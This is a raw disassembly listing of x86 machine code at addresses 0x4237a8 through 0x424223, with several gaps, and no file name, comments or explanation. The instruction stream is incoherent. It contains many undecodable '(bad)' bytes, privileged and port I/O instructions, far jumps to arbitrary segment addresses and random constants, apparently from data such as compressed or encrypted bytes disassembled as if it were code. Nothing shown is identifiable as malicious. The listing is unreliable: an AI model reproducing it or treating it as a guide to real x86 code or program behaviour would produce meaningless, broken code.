  4237a8:	mov    ds:0xce93aa43,al
  4237ad:	mov    DWORD PTR [ebp-0x5f2e7d24],ebp
  4237b3:	mov    esi,0x32046545
  4237b8:	fldenv [ebp-0x4d65736a]
  4237be:	add    DWORD PTR [edi+0x1d739160],esp
  4237c4:	loopne 0x4237a7
  4237c6:	jmp    0xaa6f77e8
  4237cb:	sbb    al,0x40
  4237cd:	dec    edi
  4237ce:	xor    bl,BYTE PTR [ebx-0x1d]
  4237d1:	dec    ebp
  4237d2:	rcr    edx,1
  4237d4:	sbb    eax,0xf5cf1637
  4237d9:	pop    edx
  4237da:	idiv   BYTE PTR [ecx+0x6014130e]
  4237e0:	stos   DWORD PTR es:[edi],eax
  4237e1:	or     DWORD PTR [edx+ebx*4],edi
  4237e4:	addr16 hlt 
  4237e6:	test   eax,0x5fa6a1dc
  4237eb:	push   0xffffffb4
  4237ed:	int    0x0
	...
  423853:	add    BYTE PTR [eax],al
  423855:	add    BYTE PTR [ebx+eiz*1],dh
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xc85b0120
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	pop    es
  42386f:	inc    edi
  423870:	inc    eax
  423871:	dec    esp
  423872:	out    dx,eax
  423873:	pusha  
  423874:	fistp  QWORD PTR [edx-0x5643cc87]
  42387a:	pop    eax
  42387b:	test   eax,0xf6d92f43
  423880:	adc    bl,BYTE PTR ds:0xaa67a367
  423886:	retf   
  423887:	sub    ch,BYTE PTR [eax+edx*4+0x48d944f9]
  42388e:	daa    
  42388f:	mov    eax,0x4717dce5
  423894:	ins    BYTE PTR es:[edi],dx
  423895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423896:	push   eax
  423897:	push   0xfffffff3
  423899:	sbb    BYTE PTR [ecx],ah
  42389b:	xor    dl,ah
  42389d:	mov    al,ds:0x7bbcc2d0
  4238a2:	pop    ecx
  4238a3:	mov    ebx,0xd5193d71
  4238a8:	mov    ds:0x742ec34b,al
  4238ad:	int3   
  4238ae:	shl    al,1
  4238b0:	jl     0x42384e
  4238b2:	adc    BYTE PTR [esp+edx*1],0x30
  4238b6:	cli    
  4238b7:	icebp  
  4238b8:	jo     0x4238a1
  4238ba:	int3   
  4238bb:	add    eax,0x8e2277c9
  4238c0:	dec    ecx
  4238c1:	add    esp,DWORD PTR [edx-0x63c7ca68]
  4238c7:	push   es
  4238c8:	mov    ah,0xc0
  4238ca:	jle    0x423921
  4238cc:	or     DWORD PTR [ebx-0x64],ecx
  4238cf:	dec    edi
  4238d0:	mov    al,0xc7
  4238d2:	bound  ecx,QWORD PTR [esi]
  4238d4:	(bad)  
  4238d6:	int    0x4a
  4238d8:	into   
  4238d9:	mov    bh,0x2a
  4238db:	sub    al,0xe5
  4238dd:	(bad)  
  4238de:	test   eax,0xe4ad2e0f
  4238e3:	aaa    
  4238e4:	(bad)  
  4238e5:	pop    edx
  4238e6:	fwait
  4238e7:	sbb    DWORD PTR [esp+edx*1],esi
  4238ea:	sbb    bl,ch
  4238ec:	pop    ecx
  4238ed:	adc    eax,0x92d14457
  4238f2:	sahf   
  4238f3:	or     al,0x8f
  4238f5:	push   eax
  4238f6:	mov    es,WORD PTR [ecx-0x70]
  4238f9:	leave  
  4238fa:	out    dx,eax
  4238fb:	popf   
  4238fc:	jle    0x423975
  4238fe:	in     eax,0x7e
  423900:	lock shr DWORD PTR [edi-0x4a13fceb],1
  423907:	cdq    
  423908:	repz ror BYTE PTR [edx+0x1b3595e3],cl
  42390f:	loopne 0x4238a1
  423911:	or     DWORD PTR ss:[esi-0x7e5875d3],eax
  423918:	mov    edx,0x81e02154
  42391d:	pop    edi
  42391e:	dec    edi
  42391f:	inc    esi
  423920:	add    BYTE PTR [ebx+0x74692157],al
  423926:	inc    ebp
  423927:	sbb    BYTE PTR [ecx],ah
  423929:	xchg   ebx,eax
  42392a:	aam    0x2
  42392c:	test   eax,0x4dae4744
  423931:	or     DWORD PTR [edx+0x26142088],ecx
  423937:	sub    ch,bh
  423939:	jb     0x4238c8
  42393b:	lods   eax,DWORD PTR ds:[esi]
  42393c:	jle    0x42391e
  42393e:	fimul  WORD PTR [edi]
  423940:	push   esp
  423941:	push   0xd68b5273
  423946:	sbb    eax,DWORD PTR [edx]
  423948:	(bad)  
  423949:	nop
  42394a:	cmp    esi,esp
  42394c:	pop    ss
  42394d:	shr    dh,1
  42394f:	sub    BYTE PTR [ecx],ah
  423951:	lea    esi,[esi+0x1f7630bc]
  423957:	aaa    
  423958:	rol    BYTE PTR [esi],1
  42395a:	xchg   BYTE PTR [ebx+ebx*4],al
  42395d:	(bad)  
  42395e:	mov    esp,DWORD PTR [ebx+0x677b1359]
  423964:	loope  0x42391f
  423966:	out    dx,al
  423967:	mov    cl,0x35
  423969:	jo     0x423939
  42396b:	and    al,dh
  42396d:	xor    eax,0x0
	...
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0xef452bbd
  4239e4:	inc    ebx
  4239e5:	fsub   DWORD PTR [edi+0x7e]
  4239e8:	add    DWORD PTR [eax],eax
  4239ea:	add    BYTE PTR [ecx],al
  4239ec:	add    BYTE PTR [eax],al
  4239ee:	push   eax
  4239ef:	scas   eax,DWORD PTR es:[edi]
  4239f0:	es js  0x423a3c
  4239f3:	push   esi
  4239f4:	xor    ebx,0x20
  4239f7:	(bad)  
  4239f8:	mov    ds:0xd510124,al
  4239fd:	push   cs
  4239fe:	iret   
  4239ff:	mov    DWORD PTR [ebx-0x698a4663],ebp
  423a05:	dec    eax
  423a06:	ins    BYTE PTR es:[edi],dx
  423a07:	pop    esp
  423a08:	inc    eax
  423a09:	xor    eax,0x556e0f21
  423a0e:	adc    eax,0xc7c6ea64
  423a13:	in     al,0x5d
  423a15:	ins    BYTE PTR es:[edi],dx
  423a16:	xchg   ebp,eax
  423a17:	sub    ecx,edi
  423a19:	adc    edx,ecx
  423a1b:	jno    0x4239f4
  423a1d:	mov    al,ds:0xc3d3058d
  423a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a23:	fucomp st(5)
  423a25:	gs mov bh,0x5a
  423a28:	repnz add al,BYTE PTR [ecx-0x7926085]
  423a2f:	push   ecx
  423a30:	lds    eax,FWORD PTR [esi]
  423a32:	in     al,dx
  423a33:	(bad)  
  423a34:	stc    
  423a35:	inc    ebp
  423a36:	xchg   ebx,eax
  423a37:	(bad)  
  423a39:	ja     0x423a36
  423a3b:	or     DWORD PTR [edx],0x8757e
  423a41:	jmp    0xf0bb:0xe78126a8
  423a48:	and    eax,0x5ac5c726
  423a4d:	fdivr  DWORD PTR [edi+0x19]
  423a50:	and    DWORD PTR [ecx],eax
  423a52:	and    eax,0x9b324026
  423a57:	fsub   QWORD PTR [edx+edx*8-0x5e6a3273]
  423a5e:	jmp    0x1860:0x265c3e1a
  423a65:	push   edi
  423a66:	pop    esi
  423a67:	mov    eax,ds:0xfd73e37c
  423a6c:	xor    al,0xe2
  423a6e:	jno    0x423a51
  423a70:	sub    eax,0xb1e7bce6
  423a75:	jmp    0x423a8a
  423a77:	mov    eax,0x487e662a
  423a7c:	cmp    eax,0xb6b7c17
  423a81:	add    BYTE PTR [ebp+0x426d0c4e],ch
  423a87:	lea    ebp,[edx+eiz*8-0x5a396825]
  423a8e:	fs popf 
  423a90:	cmp    eax,0xae3e0b35
  423a95:	jns    0x423ad1
  423a97:	lea    ecx,[ebx+0x5b]
  423a9a:	call   0x2e1f5c32
  423a9f:	mov    cl,0x80
  423aa1:	mov    esp,0x56e378bf
  423aa6:	(bad)  
  423aa8:	(bad)  
  423aa9:	int    0x73
  423aab:	(bad)  
  423aad:	(bad)  
  423aae:	imul   edx,edx,0x977b2787
  423ab4:	mov    eax,0xb1365b73
  423ab9:	mov    DWORD PTR [ebx-0x5d24d4f7],eax
  423abf:	cdq    
  423ac0:	push   ds
  423ac1:	mov    esi,0x86f9b00a
  423ac6:	sti    
  423ac7:	daa    
  423ac8:	mov    fs,ecx
  423aca:	mov    bh,0x37
  423acc:	and    dl,cl
  423ace:	xor    DWORD PTR [edi+edi*2-0x6f],0xffffff96
  423ad3:	inc    esi
  423ad4:	stos   DWORD PTR es:[edi],eax
  423ad5:	add    ebx,DWORD PTR [edx]
  423ad7:	pop    esp
  423ad8:	jno    0x423a73
  423ada:	add    eax,0x41eedfd6
  423adf:	push   edi
  423ae0:	push   eax
  423ae1:	dec    ebx
  423ae2:	bound  edx,QWORD PTR [ebx+0x37]
  423ae5:	out    0x4d,eax
  423ae7:	xchg   esi,eax
  423ae8:	push   cs
  423ae9:	adc    al,0x7c
  423aeb:	mov    DWORD PTR [eax+0x3],edi
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	cmp    DWORD PTR [ebp+0x7f6757d9],ebp
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	add    BYTE PTR [ecx],al
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	cwde   
  423b6f:	cdq    
  423b70:	add    eax,0x5199ec4a
  423b75:	jbe    0x423b87
  423b77:	repz leave 
  423b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b7a:	dec    eax
  423b7b:	jno    0x423b68
  423b7d:	ins    DWORD PTR es:[edi],dx
  423b7e:	and    DWORD PTR [esi-0x637b5c9b],edi
  423b84:	aad    0xd
  423b86:	stc    
  423b87:	xor    DWORD PTR [eax-0x7f0b5c95],ecx
  423b8d:	(bad)  
  423b8f:	stos   BYTE PTR es:[edi],al
  423b90:	leave  
  423b91:	call   0xeb7f9fa2
  423b96:	pushf  
  423b97:	sbb    al,0x94
  423b99:	(bad)  
  423b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b9b:	mov    ah,0xf9
  423b9d:	mov    esi,edx
  423b9f:	mov    ebp,0x18354b4a
  423ba4:	push   0x3c
  423ba6:	jp     0x423b78
  423ba8:	lea    ecx,[esi-0x3]
  423bab:	inc    edx
  423bac:	outs   dx,DWORD PTR ds:[esi]
  423bad:	xor    cl,BYTE PTR ds:0xa024faba
  423bb3:	shl    BYTE PTR [edi+edi*1+0x71],0xe0
  423bb8:	dec    edx
  423bb9:	xor    bl,BYTE PTR [edx]
  423bbb:	or     ebx,edx
  423bbd:	jno    0x423c35
  423bbf:	iret   
  423bc0:	test   al,0xc8
  423bc2:	inc    eax
  423bc3:	in     eax,dx
  423bc4:	mov    dh,0x21
  423bc6:	and    eax,0xc9db0063
  423bcb:	fstp   TBYTE PTR [esi-0x33]
  423bce:	das    
  423bcf:	xor    eax,0xffa1d149
  423bd4:	push   edi
  423bd5:	jo     0x423c14
  423bd7:	pusha  
  423bd8:	jne    0x423b9a
  423bda:	dec    edi
  423bdb:	jg     0x423c1f
  423bdd:	lahf   
  423bde:	arpl   bp,cx
  423be0:	loop   0x423bc1
  423be2:	add    al,0x9a
  423be4:	shl    DWORD PTR [ecx+esi*4+0x32],cl
  423be8:	daa    
  423be9:	mov    cl,0x84
  423beb:	jle    0x423bf8
  423bed:	shl    DWORD PTR [ecx],0x64
  423bf0:	out    0x21,eax
  423bf2:	or     esi,DWORD PTR [esp+ebx*1]
  423bf5:	push   ss
  423bf6:	adc    DWORD PTR [ecx+0x7aaa1b36],ebx
  423bfc:	mov    ebx,edi
  423bfe:	fst    DWORD PTR [edx-0x21]
  423c01:	cmp    DWORD PTR [ecx-0x6e],0x4d8337b8
  423c08:	repz cmp eax,ecx
  423c0b:	aam    0xcd
  423c0d:	mov    cl,0xf7
  423c0f:	mov    ds:0x8263f940,al
  423c14:	test   al,0xf6
  423c16:	in     al,0x14
  423c18:	es loope 0x423bcd
  423c1b:	pop    esi
  423c1c:	ja     0x423c7f
  423c1e:	mov    dh,0xcd
  423c20:	jo     0x423c54
  423c22:	pop    si
  423c24:	push   edx
  423c25:	jge    0x423c6c
  423c27:	mov    edi,0xf311105e
  423c2c:	jbe    0x423ca3
  423c2e:	and    BYTE PTR [ecx+0x79200dab],al
  423c34:	aas    
  423c35:	mov    edx,0xd6b7395f
  423c3a:	stos   BYTE PTR es:[edi],al
  423c3b:	mov    BYTE PTR [edx+ebx*4],bh
  423c3e:	xchg   BYTE PTR [ebp+0x5b],bh
  423c41:	int3   
  423c42:	loopne 0x423c5a
  423c44:	pusha  
  423c45:	sub    ebp,esi
  423c47:	xchg   BYTE PTR [edi+0xdf1226],dh
  423c4d:	shl    BYTE PTR ds:0xbbe1c7e3,1
  423c53:	in     eax,dx
  423c54:	sub    al,0x8a
  423c56:	dec    esi
  423c57:	js     0x423ca7
  423c59:	mov    ds:0x915de403,eax
  423c5e:	jg     0x423ca6
  423c60:	xor    al,0x5c
  423c62:	das    
  423c63:	shl    ebx,0x7d
  423c66:	bound  ecx,QWORD PTR [edx]
  423c68:	mov    esp,0x3e71404
  423c6d:	in     al,dx
	...
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x54bb99e9]
  423ce3:	jle    0x423d5b
  423ce5:	add    al,0x67
  423ce7:	add    BYTE PTR [ecx],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	out    0x97,al
  423cf0:	mov    bl,0x3
  423cf2:	push   ds
  423cf3:	cmp    BYTE PTR [esi],dh
  423cf5:	sub    BYTE PTR ds:0xd4dd5e33,ah
  423cfb:	or     ah,dl
  423cfd:	jno    0x423d31
  423cff:	dec    ecx
  423d00:	pop    edi
  423d01:	push   ebx
  423d02:	fsubr  st,st(6)
  423d04:	cmp    al,0x44
  423d06:	std    
  423d07:	pushf  
  423d08:	pusha  
  423d09:	mov    esp,0x95ca9136
  423d0e:	pop    es
  423d0f:	(bad)  
  423d10:	or     eax,0x688ccbee
  423d15:	aas    
  423d16:	scas   al,BYTE PTR es:[edi]
  423d17:	fisub  WORD PTR [ecx+ebx*1]
  423d1a:	dec    edi
  423d1b:	cmp    DWORD PTR [edx-0x73],eax
  423d1e:	(bad)  
  423d1f:	xor    eax,0x90945e39
  423d24:	pop    esp
  423d25:	imul   edi,DWORD PTR [ebp+0x1f],0xd
  423d29:	int    0x73
  423d2b:	mov    esi,0x98dc9f50
  423d30:	lods   eax,DWORD PTR ds:[esi]
  423d31:	into   
  423d32:	es daa 
  423d34:	cwde   
  423d35:	cmp    edx,DWORD PTR [esi]
  423d37:	lahf   
  423d38:	xlat   BYTE PTR ds:[ebx]
  423d39:	std    
  423d3a:	cmc    
  423d3b:	outs   dx,DWORD PTR ds:[esi]
  423d3c:	call   FWORD PTR [ebx]
  423d3e:	shl    DWORD PTR [eax-0xd718c02],0xdb
  423d45:	leave  
  423d46:	rcl    BYTE PTR [ecx-0x17],0x62
  423d4a:	icebp  
  423d4b:	or     ecx,DWORD PTR [ebx+0x56]
  423d4e:	pop    ecx
  423d4f:	xchg   BYTE PTR [edx-0x5],dl
  423d52:	imul   DWORD PTR [esp+esi*1+0x742fb3c1]
  423d59:	gs and esp,ebx
  423d5c:	jle    0x423d2a
  423d5e:	les    edi,FWORD PTR [ebp-0x6ec39021]
  423d64:	dec    esi
  423d65:	fs or  al,0xd3
  423d68:	jno    0x423d92
  423d6a:	pop    ebp
  423d6b:	sar    BYTE PTR [eax-0x55],1
  423d6e:	jne    0x423cf3
  423d70:	aad    0xf0
  423d72:	mov    al,0x59
  423d74:	cmc    
  423d75:	test   al,0x27
  423d77:	sbb    al,0x61
  423d79:	pusha  
  423d7a:	imul   ecx,edx,0x48794cd3
  423d80:	dec    edi
  423d81:	sbb    al,0x20
  423d83:	bound  ebx,QWORD PTR [eax-0x20271159]
  423d89:	xchg   BYTE PTR [ecx-0x7f658d43],al
  423d8f:	ds pop esi
  423d91:	pop    es
  423d92:	fs pusha 
  423d94:	(bad)  
  423d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d97:	and    ch,cl
  423d99:	(bad)  [edx-0x1319d8b9]
  423d9f:	fcomp  QWORD PTR [edx*2-0x39f48ee8]
  423da6:	aad    0xb4
  423da8:	das    
  423da9:	call   0x551454c
  423dae:	xor    al,0xa1
  423db0:	add    al,0x34
  423db2:	fwait
  423db3:	sub    al,0x37
  423db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423db6:	fst    DWORD PTR [esi-0x43456fe8]
  423dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dbd:	ror    DWORD PTR [eax],cl
  423dbf:	iret   
  423dc0:	and    edi,DWORD PTR [ecx-0x1e70c480]
  423dc6:	lods   eax,DWORD PTR ds:[esi]
  423dc7:	mov    DWORD PTR [esi+0x46],0x41b01e71
  423dce:	or     DWORD PTR [ebx],0xa0514ec2
  423dd4:	xor    ebp,DWORD PTR [edi]
  423dd6:	ret    
  423dd7:	sbb    BYTE PTR [ecx+0x73],al
  423dda:	popa   
  423ddb:	pop    esi
  423ddc:	sbb    ebx,ebp
  423dde:	inc    edx
  423ddf:	shl    BYTE PTR [edx],cl
  423de1:	xchg   esi,eax
  423de2:	pop    ds
  423de3:	mov    dh,0xe7
  423de5:	out    dx,eax
  423de6:	pop    ecx
  423de7:	sti    
  423de8:	int3   
  423de9:	inc    esi
  423dea:	add    BYTE PTR [esi+0x42],al
  423ded:	fadd   DWORD PTR [eax]
	...
  423e53:	add    BYTE PTR [eax],al
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax+0x2f1c23d2],esp
  423e65:	mov    BYTE PTR [edi-0x7f],ah
  423e68:	add    DWORD PTR [eax],eax
  423e6a:	add    BYTE PTR [ecx],al
  423e6c:	add    BYTE PTR [eax],al
  423e6e:	dec    edx
  423e6f:	arpl   WORD PTR [eax+eax*8],ax
  423e72:	dec    BYTE PTR [esi]
  423e74:	mov    ds:0x72b7b62a,al
  423e79:	jg     0x423e25
  423e7b:	sbb    ah,bh
  423e7d:	adc    al,BYTE PTR [eax+0x0]
  423e80:	cmp    al,0xdf
  423e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e83:	dec    eax
  423e84:	mul    DWORD PTR [ebp+0x51]
  423e87:	ja     0x423f02
  423e89:	push   esp
  423e8a:	cmp    al,0x50
  423e8c:	sub    BYTE PTR [edi],ch
  423e8e:	test   al,0xe
  423e90:	data16 (bad) 
  423e92:	fsub   st(0),st
  423e94:	(bad)  
  423e95:	xlat   BYTE PTR ds:[ebx]
  423e96:	xchg   ebp,eax
  423e97:	ds add al,0xbb
  423e9a:	xor    ebp,DWORD PTR [edi+0x27]
  423e9d:	dec    edi
  423e9e:	shl    ebx,1
  423ea0:	sub    DWORD PTR [ebx+0x4a146bd1],edx
  423ea6:	scas   al,BYTE PTR es:[edi]
  423ea7:	or     al,0x21
  423ea9:	mov    BYTE PTR [ecx-0x76],al
  423eac:	dec    edx
  423ead:	scas   eax,DWORD PTR es:[edi]
  423eae:	(bad)  
  423eaf:	push   ds
  423eb0:	ret    
  423eb1:	aaa    
  423eb2:	push   edi
  423eb3:	test   al,0xec
  423eb5:	mov    esi,0x42641223
  423eba:	fsubr  QWORD PTR [ebx+0x43]
  423ebd:	push   ds
  423ebe:	xchg   ecx,eax
  423ebf:	and    eax,0x2a3494e1
  423ec4:	mov    ebp,0x4ee0c726
  423ec9:	enter  0xec12,0x5e
  423ecd:	mov    bh,0xb5
  423ecf:	cmp    dl,dl
  423ed1:	push   edi
  423ed2:	jmp    ebx
  423ed4:	fcmovnu st,st(7)
  423ed6:	xchg   ebp,eax
  423ed7:	shr    DWORD PTR [edx],cl
  423ed9:	sbb    BYTE PTR ds:0x723e8ab4,al
  423edf:	add    ebx,DWORD PTR [edi+0x68]
  423ee2:	jmp    0x1933:0xdf600cd4
  423ee9:	add    BYTE PTR [esi+edi*8+0xab1abc7],0x45
  423ef1:	in     eax,0x8d
  423ef3:	mov    ds:0xa8c2af38,eax
  423ef8:	push   ecx
  423ef9:	pop    esp
  423efa:	call   0xc363:0x33fd72f2
  423f01:	es xchg edi,eax
  423f03:	sahf   
  423f04:	cmp    al,0xe8
  423f06:	sahf   
  423f07:	xchg   edi,eax
  423f08:	fst    QWORD PTR [ecx+0x5e680b76]
  423f0e:	add    DWORD PTR [esi+0x4bb79b73],esp
  423f14:	fptan  
  423f16:	lock push edi
  423f18:	xchg   ecx,eax
  423f19:	out    0x34,eax
  423f1b:	shl    DWORD PTR [ebp+0x63b311b7],cl
  423f21:	jmp    0x423f1e
  423f23:	cmp    BYTE PTR [esi+0x6fc738f8],dh
  423f29:	ret    0x8148
  423f2c:	enter  0x577a,0xbd
  423f30:	das    
  423f31:	xor    esp,esp
  423f33:	addr16 and dl,cl
  423f36:	into   
  423f37:	cs sub eax,0x5fa86af0
  423f3d:	add    al,BYTE PTR [edx-0x5ee417da]
  423f43:	add    ebp,DWORD PTR [esi+0x240bf513]
  423f49:	pop    es
  423f4a:	inc    ebx
  423f4b:	adc    BYTE PTR ds:0x9434edc7,ah
  423f51:	jle    0x423edc
  423f53:	mov    edx,0x505a2d14
  423f58:	ins    DWORD PTR es:[edi],dx
  423f59:	dec    edx
  423f5a:	xor    al,ch
  423f5c:	call   0x120:0x4e243863
  423f63:	in     al,0xa1
  423f65:	stos   BYTE PTR es:[edi],al
  423f66:	(bad)  
  423f67:	(bad)  
  423f68:	mov    ebx,0xeca79c32
  423f6d:	jae    0x423f6f
	...
  423fd3:	add    BYTE PTR [eax],al
  423fd5:	add    BYTE PTR [esi+0x74b9649a],ch
  423fdb:	(bad)  
  423fdc:	call   FWORD PTR [edi-0x26e369ec]
  423fe2:	inc    eax
  423fe3:	sbb    al,0x58
  423fe5:	xchg   DWORD PTR [edi-0x7e],esp
  423fe8:	add    DWORD PTR [eax],eax
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	in     al,0xa6
  423ff0:	cmc    
  423ff1:	add    al,0xf
  423ff3:	data16 int3 
  423ff5:	cmc    
  423ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ff7:	or     eax,0xcb26f001
  423ffc:	sbb    dh,BYTE PTR [ebx]
  423ffe:	arpl   WORD PTR [edi-0x4d],sp
  424001:	dec    edx
  424002:	cmp    BYTE PTR [ebp+0x20],cl
  424005:	mov    eax,0x28b7b0ea
  42400a:	pop    edx
  42400b:	gs dec esp
  42400d:	mov    ebx,0x4ce145e5
  424012:	ds loope 0x42405a
  424015:	mov    eax,0x8c03e2a7
  42401a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42401b:	and    eax,0x2135bb0a
  424020:	add    ah,bh
  424022:	fs mov al,al
  424025:	in     al,0xaa
  424027:	fld    DWORD PTR [ebx-0x457cf66c]
  42402d:	leave  
  42402e:	xor    ebx,ebp
  424030:	push   es
  424031:	fstp   TBYTE PTR [esi-0xb]
  424034:	ins    BYTE PTR es:[edi],dx
  424035:	(bad)  
  424036:	stos   BYTE PTR es:[edi],al
  424037:	xor    al,bl
  424039:	pusha  
  42403a:	loop   0x42402a
  42403c:	cmp    ebx,0xffffff88
  42403f:	xor    DWORD PTR [esp+ecx*4+0x62],edx
  424043:	fimul  WORD PTR [eax+0x7d]
  424046:	cmp    bl,BYTE PTR [esi-0x369dc648]
  42404c:	add    eax,0xf8953b1a
  424051:	scas   eax,DWORD PTR es:[edi]
  424052:	push   es
  424053:	cmc    
  424054:	xor    al,BYTE PTR [edi-0x2]
  424057:	shl    bh,0xf1
  42405a:	bound  edx,QWORD PTR [edx+0x7f]
  42405d:	cmp    ebp,DWORD PTR [ebx]
  42405f:	popf   
  424060:	push   ecx
  424061:	xlat   BYTE PTR ds:[ebx]
  424062:	(bad)  
  424063:	jmp    0xc788:0xed3021c1
  42406a:	call   0xbe77:0xb7022a7
  424071:	dec    ebp
  424072:	add    esp,DWORD PTR [edx-0x4f809d94]
  424078:	out    0x9e,al
  42407a:	dec    esi
  42407b:	push   0x55
  42407d:	xchg   esi,eax
  42407e:	push   es
  42407f:	and    al,0x9a
  424081:	cld    
  424082:	jge    0x4240f3
  424084:	or     DWORD PTR [ecx-0x3e],0x538f6465
  42408b:	in     eax,dx
  42408c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42408d:	adc    al,0xde
  42408f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424090:	xchg   ebp,eax
  424091:	lock mov eax,0x7b169199
  424097:	aad    0xf3
  424099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42409a:	jne    0x42407d
  42409c:	clc    
  42409d:	fisubr DWORD PTR [ecx+0x42]
  4240a0:	shl    bl,cl
  4240a2:	dec    eax
  4240a3:	lock div DWORD PTR ds:0xaec6baae
  4240aa:	push   ebx
  4240ab:	scas   al,BYTE PTR es:[edi]
  4240ac:	and    DWORD PTR [eax+0x153e55d8],eax
  4240b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b3:	mov    ecx,0xcf47c7da
  4240b8:	cmp    DWORD PTR [edx+0x20],eax
  4240bb:	js     0x424111
  4240bd:	sub    eax,0xc2ba5ec6
  4240c2:	xchg   ebx,eax
  4240c3:	(bad)  
  4240c4:	xchg   ebx,eax
  4240c5:	es cld 
  4240c7:	lea    esi,[esi-0x80]
  4240ca:	mov    al,ds:0x1f1b3e3c
  4240d0:	int    0x5e
  4240d2:	out    0x6b,eax
  4240d4:	addr16 dec ebx
  4240d6:	stc    
  4240d7:	mov    ah,0xae
  4240d9:	lock inc ecx
  4240db:	arpl   WORD PTR [edx+0x4b],sp
  4240de:	xchg   ebp,eax
  4240df:	mov    ch,0xc3
  4240e1:	adc    BYTE PTR [ecx],0xd1
  4240e4:	rcl    al,0xad
  4240e7:	pop    eax
  4240e8:	add    ebx,ecx
  4240ea:	xor    eax,0xe05e5b
	...
  424153:	add    BYTE PTR [eax],al
  424155:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424159:	mov    cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	sbb    esi,DWORD PTR [eax-0x1f]
  424165:	loopne 0x4241ce
  424167:	add    DWORD PTR [ecx],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	pop    eax
  42416f:	test   BYTE PTR [esi+0x1f],bl
  424172:	pop    ds
  424173:	mov    ds:0x375d71e,al
  424178:	shl    BYTE PTR [edi-0x2d],1
  42417b:	add    bl,bh
  42417d:	jl     0x424154
  42417f:	out    dx,al
  424180:	cli    
  424181:	xor    eax,0xe99aa34b
  424186:	repz push edi
  424188:	mov    esi,0x15fd2a88
  42418d:	xchg   DWORD PTR [ebp+0x3],edi
  424190:	retf   
  424191:	iret   
  424192:	push   0xc906ec8e
  424197:	and    cl,BYTE PTR [esi+0x73]
  42419a:	cwde   
  42419b:	inc    edi
  42419c:	mov    gs,WORD PTR [edi+0x6d5e1c18]
  4241a2:	ret    0xa3bd
  4241a5:	stos   BYTE PTR es:[edi],al
  4241a6:	test   al,0xfb
  4241a8:	mov    esi,0xd91cf4f3
  4241ad:	push   esp
  4241ae:	outs   dx,DWORD PTR ds:[esi]
  4241af:	pop    edx
  4241b0:	pop    ds
  4241b1:	cmp    DWORD PTR [ecx+0x7a230cb2],ebx
  4241b7:	xor    eax,0xe40be2ef
  4241bc:	and    edx,DWORD PTR ds:0x1694d0da
  4241c2:	pop    esp
  4241c3:	pop    edi
  4241c4:	into   
  4241c5:	or     BYTE PTR [esi+0x73],dh
  4241c8:	mov    cl,0x91
  4241ca:	pop    eax
  4241cb:	jbe    0x4241d2
  4241cd:	push   cs
  4241ce:	mov    ch,0x55
  4241d0:	enter  0x8863,0xb9
  4241d4:	stc    
  4241d5:	inc    ebx
  4241d6:	lods   eax,DWORD PTR ds:[esi]
  4241d7:	mov    WORD PTR [ebx-0x2d],ss
  4241da:	xchg   esp,eax
  4241db:	xchg   esp,eax
  4241dc:	jo     0x4241f9
  4241de:	test   BYTE PTR [eax+eiz*4],ch
  4241e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241e2:	mov    esp,DWORD PTR [eax-0x2f555002]
  4241e8:	in     al,0x2e
  4241ea:	xor    edi,esp
  4241ec:	in     eax,0x70
  4241ee:	shl    eax,cl
  4241f0:	xchg   edi,eax
  4241f1:	cld    
  4241f2:	fld    QWORD PTR [esp+esi*8]
  4241f5:	adc    bh,BYTE PTR [ebp-0x61]
  4241f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241f9:	mov    eax,0x5ce80c4e
  4241fe:	addr16 inc edi
  424200:	shl    eax,0xef
  424203:	mov    esi,0x5b98d790
  424208:	fist   DWORD PTR [eax-0x35]
  42420c:	push   esp
  42420d:	push   es
  42420e:	push   ecx
  42420f:	or     eax,0x8ae9b486
  424214:	sbb    eax,0x9593bad2
  424219:	mov    dh,0xfd
  42421b:	stc    
  42421c:	and    ch,BYTE PTR [edx-0x64]
  42421f:	xlat   BYTE PTR ds:[ebx]
  424220:	js     0x4241a8
  424222:	xchg   ebp,eax
  424223:	add    al,0x40
